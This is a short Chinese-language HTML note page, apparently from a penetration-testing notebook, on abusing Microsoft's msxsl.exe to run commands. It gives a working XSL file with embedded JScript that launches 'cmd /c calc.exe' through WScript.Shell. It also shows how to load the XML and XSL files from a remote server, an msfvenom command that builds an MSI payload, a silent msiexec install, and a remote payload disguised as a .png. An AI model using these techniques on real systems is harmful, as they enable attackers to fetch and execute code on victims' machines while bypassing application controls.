<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>msxsl</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>msxsl</h1><br/>msxsl.exe是微软用于命令行下处理XSL的一个程序，所以通过他，我们可以执行JavaScript进而执行系统命令。<br /><br />下载地址为：<br /><br /> Command Line Transformation Utility (msxsl.exe) <br /><br /><a href="https://www.microsoft.com/en-us/download/details.aspx?id=21714">https://www.microsoft.com/en-us/download/details.aspx?id=21714</a><br /><br />msxsl.exe 需要接受两个文件，XML及XSL文件，命令行操作如下：<br />```<br />msxsl.exe demo.xml exec.xsl<br />```<br /><br />demo.xml<br />```<br />&lt;?xml version=&quot;1.0&quot;?&gt;<br />&lt;?xml-stylesheet type=&quot;text/xsl&quot; href=&quot;exec.xsl&quot; ?&gt;<br />&lt;customers&gt;<br />&lt;customer&gt;<br />&lt;name&gt;Microsoft&lt;/name&gt;<br />&lt;/customer&gt;<br />&lt;/customers&gt;<br />```<br /><br />exec.xsl<br />```<br />&lt;?xml version=&#39;1.0&#39;?&gt;<br />&lt;xsl:stylesheet version=&quot;1.0&quot;<br />xmlns:xsl=&quot;<a href="http://www.w3.org/1999/XSL/Transform"">http://www.w3.org/1999/XSL/Transform&quot;</a><br />xmlns:msxsl=&quot;urn:schemas-microsoft-com:xslt&quot;<br />xmlns:user=&quot;<a href="http://mycompany.com/mynamespace">">http://mycompany.com/mynamespace&quot;&gt;</a><br />  <br />&lt;msxsl:script language=&quot;JScript&quot; implements-prefix=&quot;user&quot;&gt;<br />   function xml(nodelist) {<br />var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c calc.exe&quot;);<br />   return nodelist.nextNode().xml;<br />  <br />   }<br />&lt;/msxsl:script&gt;<br />&lt;xsl:template match=&quot;/&quot;&gt;<br />   &lt;xsl:value-of select=&quot;user:xml(.)&quot;/&gt;<br />&lt;/xsl:template&gt;<br />&lt;/xsl:stylesheet&gt;<br />```<br />同样的，msxsl.exe可以远程加载，具体方式如下：<br />```<br />msxsl <a href="https://website.com/scripts/demo.xml">https://website.com/scripts/demo.xml</a> <a href="https://website.com/scripts/exec.xsl">https://website.com/scripts/exec.xsl</a><br />```<br /><br />#### MSF生成MSI：<br /><br />```<br />msfvenom -f msi -p windows/exec CMD=calc.exe &gt; cacl.msi<br />```<br /><br />命令行运行：<br />```<br />msiexec /quiet /i cacl.msi<br />```<br />将payload放在远程服务器上运行：<br /><br />```<br /><a href="https://website.com/payloads/calc.png">https://website.com/payloads/calc.png</a><p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>